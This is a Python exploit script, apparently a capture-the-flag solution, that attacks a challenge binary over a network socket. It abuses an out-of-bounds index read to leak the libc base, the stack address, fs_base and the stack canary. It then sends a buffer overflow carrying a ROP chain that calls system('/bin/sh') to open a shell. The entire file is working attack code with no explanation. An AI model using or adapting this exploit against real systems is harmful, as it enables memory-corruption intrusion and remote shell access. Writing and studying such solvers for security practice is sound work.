from ptrlib import *
import time
import os

def read(index):
    sock.sendlineafter("index: ", str(index))
    return int(sock.recvline())

def ofs(addr):
    return (addr - elf.symbol('array')) // 8

HOST = os.getenv("HOST", "localhost")
PORT = int(os.getenv("PORT", "9004"))

elf = ELF("../distfiles/chall")
libc = ELF("../distfiles/libc.so.6")

while True:
    libc.base = 0
    #sock = Process("../distfiles/chall")
    sock = Socket(HOST, PORT)

    libc.base = read(-11) - libc.symbol('atoll')
    addr_stack = read(ofs(libc.symbol('environ')))
    logger.info("stack = " + hex(addr_stack))
    fs_base = read(ofs(addr_stack - 0x900))
    logger.info("fs_base = " + hex(fs_base))
    if fs_base & 0xf != 0:
        logger.error("Bad luck!")
        sock.close()
        continue
    canary = read(ofs(fs_base + 0x28))
    logger.info("canary = " + hex(canary))
    if canary & 0xff != 0:
        logger.error("Bad luck!")
        sock.close()
        continue

    payload  = b"A"*0x28
    payload += p64(canary)
    payload += b"A"*8
    payload += p64(next(libc.gadget("ret;")))
    payload += p64(next(libc.gadget("pop rdi; ret;")))
    payload += p64(next(libc.find("/bin/sh")))
    payload += p64(libc.symbol("system"))
    sock.sendlineafter("index: ", payload)

    sock.sh()
    break

